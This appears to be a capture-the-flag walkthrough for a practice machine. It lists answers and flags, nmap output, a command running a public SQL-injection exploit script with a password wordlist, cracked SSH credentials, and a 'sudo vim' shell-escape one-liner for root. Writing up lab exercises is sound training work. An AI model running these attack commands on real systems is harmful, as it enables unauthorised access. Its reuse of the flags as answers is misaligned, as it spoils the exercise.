# EastCTF
##### Question 1: How many services are running under port 1000?
Answer
```bash
2
```

##### Question 2: What is running on the higher port?
Answer
```bash
ssh
```

##### Question 3: What's the CVE you're using against the application?
Answer
```bash
CVE-2019-9053
```

##### Question 4: To what kind of vulnerability is the application vulnerable?
Answer
```bash
sqli
```

##### Question 5: What's the password?
Answer
```bash
secret
```

##### Question 6: Where can you login with the details obtained?
Answer
```bash
ssh
```

##### Question 7: What's the user flag?
Answer
```bash
G00d j0b, keep up!
```

##### Question 8: Is there any other user in the home directory? What's its name?
Answer
```bash
sunbath
```

##### Question 9: What can you leverage to spawn a privileged shell?
Answer
```bash
vim
```

##### Question 10: What's the root flag?
Answer
```bash
W3ll d0n3. You made it!
```

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  - - - 

Nmap Scans:
```bash

Nmap scan report for 10.10.135.95
Host is up (0.11s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.32.32
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)


```

script to get mitch login
https://www.exploit-db.com/exploits/46635

```bash

/46635.py -u http://10.10.135.95/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```
ssh creds: mitch:secret

sudo vim priv esc
```bash
sudo vim -c ':!/bin/sh'
```